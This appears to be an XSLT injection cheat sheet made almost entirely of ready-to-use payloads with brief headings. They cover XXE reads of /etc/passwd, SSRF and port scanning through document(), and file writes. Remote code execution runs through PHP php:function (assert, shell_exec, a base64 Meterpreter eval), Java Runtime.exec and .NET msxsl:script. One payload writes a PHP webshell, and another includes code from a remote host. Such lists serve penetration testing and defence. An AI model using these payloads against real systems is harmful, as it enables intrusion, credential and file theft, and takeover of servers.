<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
	<xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
External Entity
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits &ext_file;:
    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
Read files and SSRF using document
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    Fruits:
	    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
Write files with EXSLT extension
EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language.

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text">
      Hello World!
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
Remote Code Execution with PHP wrapper
Execute the function readfile.

<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
Execute the function scandir.

<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
  </xsl:template>
</xsl:stylesheet>
Execute a remote php file using assert

<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
  <xsl:variable name="payload">
    include("http://10.10.10.10/test.php")
  </xsl:variable>
  <xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
Execute a PHP meterpreter using PHP wrapper.

<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:variable name="eval">
      eval(base64_decode('Base64-encoded Meterpreter code'))
    </xsl:variable>
    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
  </xsl:template>
</xsl:stylesheet>
Execute a remote php file using file_put_contents

<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
  </xsl:template>
</xsl:stylesheet>
Remote Code Execution with Java
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>
Remote Code Execution with Native .NET
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
</xsl:stylesheet>
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
  --- BEGIN COMMAND OUTPUT ---
	<xsl:value-of select="user:execute()"/>
  --- END COMMAND OUTPUT ---	
  </xsl:template>
</xsl:stylesheet>

<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
        <xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
        <br />
    </body>
</html>

Read files
Internal - PHP

<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', ‘utf-8')"/>
</xsl:template>
</xsl:stylesheet>

Internal - XXE

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>

Through HTTP

<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>

<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>

Internal (PHP-function)

<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>

<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
        <xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
        <br />
    </body>
</html>

Port scan

<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>

Write to a file
XSLT 2.0

<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>

Xalan-J extension

<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>

Other ways to write files in the PDF
Include external XSL

<xsl:include href="http://extenal.web/external.xsl"/>

<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>

Execute code
php:function

<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>

<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
	
